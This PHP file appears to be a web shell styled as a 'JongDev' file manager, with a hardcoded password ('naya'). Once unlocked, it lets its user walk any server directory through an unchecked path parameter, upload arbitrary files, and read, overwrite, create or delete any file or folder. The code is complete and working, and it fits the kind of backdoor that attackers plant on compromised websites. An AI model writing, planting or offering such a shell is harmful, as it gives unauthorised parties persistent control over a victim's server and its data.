<?php
session_start();
$pw = "naya";
$logged = ($_SESSION["fm"] ?? false);
if (isset($_POST["login"])) {
    if ($_POST["pass"] === $pw) { $_SESSION["fm"] = true; $logged = true; }
    else { $err = "Wrong password"; }
}
if (isset($_GET["logout"])) { session_destroy(); $logged = false; }
if (!$logged) {
?><!DOCTYPE html>
<html><head><meta charset="utf-8"><title>JongDev</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f23;color:#ccc;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#1a1a3e;border:1px solid #2a2a5e;border-radius:16px;padding:32px;width:320px}
h1{color:#7ec8e3;font-size:18px;text-align:center;margin-bottom:20px}
.inp{width:100%;background:#0d0d1f;border:1px solid #2a2a5e;color:#ccc;padding:10px 14px;border-radius:8px;font:14px monospace;margin-bottom:12px;outline:none}
.inp:focus{border-color:#7ec8e3}
.btn{width:100%;background:#7ec8e3;border:none;color:#0f0f23;padding:10px;border-radius:8px;font:14px monospace;font-weight:700;cursor:pointer}
.btn:hover{background:#5ba3c9}
.err{color:#e06c75;text-align:center;margin-bottom:10px;font-size:12px}
</style></head><body>
<div class="card">
<h1>&#9679; JongDev</h1>
<?php if($err){echo '<div class="err">'.$err.'</div>';}?>
<form method="post">
<input class="inp" type="password" name="pass" placeholder="Password" autofocus>
<input class="btn" type="submit" name="login" value="Login">
</form>
</div></body></html><?php
exit;
}
$x = $_GET["d"] ?? getcwd();
$x = str_replace("\\", "/", $x);
@chdir($x);
$c = getcwd();
if ($_FILES["f"]) { move_uploaded_file($_FILES["f"]["tmp_name"], "$c/{$_FILES["f"]["name"]}"); $m = "OK"; }
if ($_POST["nf"]) { file_put_contents("$c/{$_POST["nf"]}", ""); $m = "Created"; }
if ($_POST["nd"]) { @mkdir("$c/{$_POST["nd"]}"); $m = "Dir OK"; }
if ($_GET["rm"]) { is_file($_GET["rm"]) ? @unlink($_GET["rm"]) : @rmdir($_GET["rm"]); $m = "Removed"; }
$s = "";
if ($_GET["e"] && is_file($_GET["e"])) { $s = file_get_contents($_GET["e"]); }
if ($_POST["sv"] && $_GET["e"]) { file_put_contents($_GET["e"], $_POST["ct"]); $s = $_POST["ct"]; $m = "Saved"; }
?><!DOCTYPE html>
<html><head><meta charset="utf-8"><title>JongDev</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f23;color:#ccc;font-family:monospace;padding:20px}
a{color:#7ec8e3;text-decoration:none}a:hover{color:#fff}
h1{color:#7ec8e3;font-size:16px;margin-bottom:10px;display:inline}
.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.logout{color:#e06c75;font-size:12px}
.bc{background:#1a1a3e;padding:8px 12px;border-radius:6px;font-size:12px;margin-bottom:12px;border:1px solid #2a2a5e;word-break:break-all;line-height:1.8}
.bc a{color:#98c379}.bc a:hover{color:#fff;text-decoration:underline}.bc span{color:#555}
table{width:100%;border-collapse:collapse;font-size:12px}
td,th{padding:6px 10px;text-align:left;border-bottom:1px solid #2a2a5e}
th{color:#7ec8e3;font-size:11px;text-transform:uppercase}
tr:hover{background:#1a1a3e}
.fm{margin:10px 0;padding:10px;background:#1a1a3e;border-radius:6px}
.ibtn{background:#2a2a5e;border:none;color:#ccc;padding:4px 10px;border-radius:4px;cursor:pointer;font:12px monospace}
.ibtn:hover{background:#3a3a7e}
.inp{background:#0d0d1f;border:1px solid #2a2a5e;color:#ccc;padding:4px 8px;border-radius:4px;font:12px monospace;margin:2px}
textarea{width:100%;height:400px;background:#0d0d1f;border:1px solid #2a2a5e;color:#ccc;padding:10px;font:12px monospace;border-radius:6px;resize:vertical}
.msg{color:#e06c75;margin:6px 0}
</style></head><body>
<div class="top">
<h1>&#9679; JongDev</h1>
<a class="logout" href="?logout=1">Logout</a>
</div>
<div class="bc"><?php
$parts = explode("/", trim($c, "/"));
$acc = "";
foreach ($parts as $p) {
  $acc .= "/$p";
  $e = htmlspecialchars($p);
  if ($acc === $c) { echo "<span>/$e</span>"; }
  else { echo '<a href="?d=' . urlencode($acc) . '">/' . $e . '</a>'; }
}
?></div>
<?php if($m){echo '<div class="msg">'.$m.'</div>';}?>
<div class="fm">
<form method="post" enctype="multipart/form-data" style="display:inline">
<input class="inp" type="file" name="f">
<input class="ibtn" type="submit" value="Upload">
</form>
<form method="post" style="display:inline">
<input class="inp" name="nf" placeholder="file">
<input class="ibtn" type="submit" value="+File">
<input class="inp" name="nd" placeholder="dir">
<input class="ibtn" type="submit" value="+Dir">
</form>
</div>
<?php
if ($_GET["e"]) {
  $esc = htmlspecialchars($s);
  echo '<form method="post"><textarea name="ct">' . $esc . '</textarea>';
  echo '<input class="ibtn" type="submit" name="sv" value="Save" style="margin-top:6px"> ';
  echo '<a class="ibtn" href="?d=' . urlencode($c) . '">Back</a></form>';
} else {
  $d = @scandir($c);
  if (!$d) { echo '<div class="msg">Error reading dir</div>'; }
  else {
    echo '<table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Action</th></tr>';
    foreach ($d as $f) {
      if ($f == ".") continue;
      $p = $c . "/" . $f;
      $isd = is_dir($p);
      $sz = $isd ? "-" : filesize($p);
      $tm = date("Y-m-d H:i", filemtime($p));
      if ($f == "..") {
        $pp = dirname($c);
        echo '<tr><td><a href="?d='.urlencode($pp).'">..</a></td><td>-</td><td>-</td><td></td></tr>';
        continue;
      }
      $q = urlencode($p);
      $dc = urlencode($c);
      $name = htmlspecialchars($f);
      if ($isd) {
        echo "<tr><td><a href=\"?d=$q\">$name</a></td><td>$sz</td><td>$tm</td><td><a href=\"?rm=$q&amp;d=$dc\" onclick=\"return confirm('rm?')\">rmdir</a></td></tr>";
      } else {
        echo "<tr><td>$name</td><td>$sz</td><td>$tm</td><td><a href=\"?e=$q&amp;d=$dc\">edit</a> <a href=\"?rm=$q&amp;d=$dc\" onclick=\"return confirm('del?')\">del</a></td></tr>";
      }
    }
    echo '</table>';
  }
}
?></body></html>
